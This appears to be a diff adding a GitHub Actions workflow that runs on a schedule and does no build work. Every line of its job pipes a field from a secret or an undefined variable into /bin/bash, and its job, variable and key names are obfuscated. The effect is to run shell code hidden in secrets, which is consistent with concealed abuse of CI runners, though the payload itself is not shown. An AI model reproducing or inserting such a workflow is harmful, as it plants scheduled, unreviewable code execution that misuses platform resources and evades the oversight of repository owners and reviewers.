@@ -1,0 +1,25 @@
+name: dabaidebuleguan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dabaidebuleguan
+        env:
+          hux7: ${{ secrets.hux7 }}
+        run: |
+          echo $hux7 | jq -r .izvkq44 | /bin/bash
+          echo $ipx32618 | jq -r .tvi39281 | /bin/bash
+          echo $iidj249 | jq -r .sdjdn9 | /bin/bash
+          echo $cnq493 | jq -r .b14 | /bin/bash
+          echo $emk9788 | jq -r .rnt405 | /bin/bash
+          echo $rtruq146 | jq -r .ffwzx741 | /bin/bash
+          echo $ur04 | jq -r .bexec68881 | /bin/bash
+          echo $h549 | jq -r .pwqd64095 | /bin/bash
+          echo $qguqc9 | jq -r .k16 | /bin/bash
+
